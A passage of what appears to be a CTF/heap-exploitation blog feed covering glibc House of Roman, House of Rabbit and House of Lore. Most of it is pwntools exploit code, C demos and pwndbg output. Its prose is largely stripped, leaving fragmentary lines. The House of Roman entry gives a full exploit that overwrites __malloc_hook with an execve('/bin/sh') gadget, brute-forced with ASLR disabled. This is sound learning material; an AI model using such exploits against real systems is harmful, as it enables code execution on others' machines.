shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__malloc_hook</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 &lt;__malloc_hook&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">find_fake_fast 0x7ffff7dd1b10 0x70</span></span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x7ffff7dd1aed</span><br><span class="line">prev_size: 0x-822fda0000000</span><br><span class="line">size: 0x7f</span><br><span class="line">fd: 0x-856d160000000</span><br><span class="line">bk: 0x-856d58fffff81</span><br><span class="line">fd_nextsize: 0x7f</span><br><span class="line">bk_nextsize: 0x00</span><br></pre></td></tr></table></figure><p>mallochookuaffastbin</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807145855329.png" alt="image-20230807145855329"></p><p>0x7ffff7dd1aedmallochook</p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br></pre></td></tr></table></figure><p>fastbin</p><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>unsortedbin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">po = b<span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += b<span class="string">&quot;\x00\x1b&quot;</span> #malloc_hook0x7ffff7dd1b10<span class="number">-0x10</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807150730458.png" alt="image-20230807150730458"></p><p><img src="/2023/08/06/House-Of-Roman/image-20230807150811005.png" alt="image-20230807150811005"></p><p>create(0xc8,1)bck-&gt;fd  malloc_hookunsorted_chunks</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">over = b<span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="meta"># padding for malloc_hook</span></span><br><span class="line">over += b<span class="string">&quot;\xa4\xd3\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">b()</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>malloc-hookunsorted_chunksoggfreemalloc_printerr mallochookogg</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>malloc_hookoggaslr12bitaslr<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>,expexp</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in `seq 1 5000`; do python exp.py; done;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn</span><br><span class="line"><span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./new_chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x931&#x27;)#free</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"><span class="comment">##free1unsortbinunsortedbin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">3</span>)  <span class="comment"># b</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">18</span>)</span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span>  <span class="comment"># set chunk  1&#x27;s size --&gt; 0x71</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#uaf1fastbiin</span></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"><span class="comment">#fdmallochook</span></span><br><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#mallochook</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#fastbin</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment"># unsortedbin attach</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x1b&quot;</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">dbpie(<span class="string">&#x27;0x09B8&#x27;</span>)<span class="comment">#malloc</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mallochookmalloc_hook</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">b&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;***\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    resp = io.recv(<span class="number">4</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a52226</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a5227a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afd3a4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afe247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807161504915.png" alt="image-20230807161504915"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Rabbit</title>
      <link href="/2023/08/05/House-of-Rabbit/"/>
      <url>/2023/08/05/House-of-Rabbit/</url>
      
        <content type="html"><![CDATA[<p> fastbin attack </p><ul><li>fastbinfdsize</li><li>malloc consolidatemalloc consolidatefastbinbin</li></ul><p> house of rabbit  malloc consolidate  fastbin  size </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>2.23</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk4;</span><br><span class="line">    <span class="type">void</span>* dummies[<span class="number">7</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// fastbin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> chunk4 &#x3D; malloc(0x1000)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602050  0x602000  0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602050</span></span><br><span class="line">00:0000     0x602050  0x0</span><br><span class="line">01:0008     0x602058  0x51 /* &#x27;Q&#x27; */</span><br><span class="line">02:0010 r8  0x602060  0x602000  0x0</span><br><span class="line">03:0018     0x602068  0x0</span><br></pre></td></tr></table></figure><p> chunk4 &#x3D; malloc(0x1000)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x602000  0x7ffff7dd1c08 (main_arena+232)  0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602000</span></span><br><span class="line">00:0000   0x602000  0x0</span><br><span class="line">01:0008   0x602008  0xa1</span><br><span class="line">02:0010   0x602010  0x7ffff7dd1c08 (main_arena+232)  0x7ffff7dd1bf8 (main_arena+216)  0x7ffff7dd1be8 (main_arena+200)  0x7ffff7dd1bd8 </span><br></pre></td></tr></table></figure><h3 id="size"><a href="#size" class="headerlink" title="size"></a>size</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk4;</span><br><span class="line">    <span class="type">void</span>* dummies[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1[<span class="number">-1</span>] = <span class="number">0xa1</span>;</span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// fastbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk4 &#x3D; malloc(0x1000);chunk1chunk2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x602050  0x7ffff7dd1bb8 (main_arena+152)  0x602050 /* &#x27;P `&#x27; */</span><br><span class="line">0xa0: 0x602000  0x7ffff7dd1c08 (main_arena+232)  0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602050</span></span><br><span class="line">00:0000   0x602050  0x0</span><br><span class="line">01:0008   0x602058  0x51 /* &#x27;Q&#x27; */</span><br><span class="line">02:0010   0x602060  0x7ffff7dd1bb8 (main_arena+152)  0x7ffff7dd1ba8 (main_arena+136)  0x7ffff7dd1b98 (main_arena+120)  0x7ffff7dd1b88 (main_arena+104)  ...</span><br><span class="line">... </span><br><span class="line">04:0020   0x602070  0x0</span><br><span class="line">... </span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602000</span></span><br><span class="line">00:0000   0x602000  0x0</span><br><span class="line">01:0008   0x602008  0xa1</span><br><span class="line">02:0010   0x602010  0x7ffff7dd1c08 (main_arena+232)  0x7ffff7dd1bf8 (main_arena+216)  0x7ffff7dd1be8 (main_arena+200)  0x7ffff7dd1bd8 (main_arena+184)  ...</span><br><span class="line">... </span><br><span class="line">04:0020   0x602020  0x0</span><br></pre></td></tr></table></figure><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">//0x602000</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//consolidate</span></span><br><span class="line">    chunk2[<span class="number">1</span>] = <span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">    chunk2[<span class="number">7</span>] = <span class="number">0x21</span>;  <span class="comment">//fake chunk&#x27;s next chunk</span></span><br><span class="line">    chunk2[<span class="number">11</span>] = <span class="number">0x21</span>; <span class="comment">//fake chunk&#x27;s next chunk&#x27;s next chuck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = chunk2;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk2smallbin</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x30: 0x602070  0x7ffff7dd1b98 (main_arena+120)  0x602070 /* &#x27;p `&#x27; */</span><br><span class="line">0x60: 0x602000  0x7ffff7dd1bc8 (main_arena+168)  0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p chunk2</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (unsigned long *) 0x602070</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Lore</title>
      <link href="/2023/08/03/House-of-Lore/"/>
      <url>/2023/08/03/House-of-Lore/</url>
      
        <content type="html"><![CDATA[<p>smallbin(FIFO) </p><p></p><ul><li>small bin chunkbk</li><li>targetfdtargetbk  target bkfdtargetbck-&gt;fd !&#x3D; victim</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">//  small bin </span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">//  small bin  chunk </span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">//  victim= last(bin) small bin  chunk</span></span><br><span class="line">        <span class="comment">//  victim = bin  bin </span></span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// small bin </span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">//  fast bins  chunk </span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// small bin  chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//  small bin  chunk </span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">//  bck-&gt;fd  victim</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//  victim  inuse </span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">//  small bin  small bin  chunk </span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">//  main_arena</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// </span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">//  chunk  mem </span></span><br><span class="line">                <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">//  perturb_type , chunk perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p></p><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span 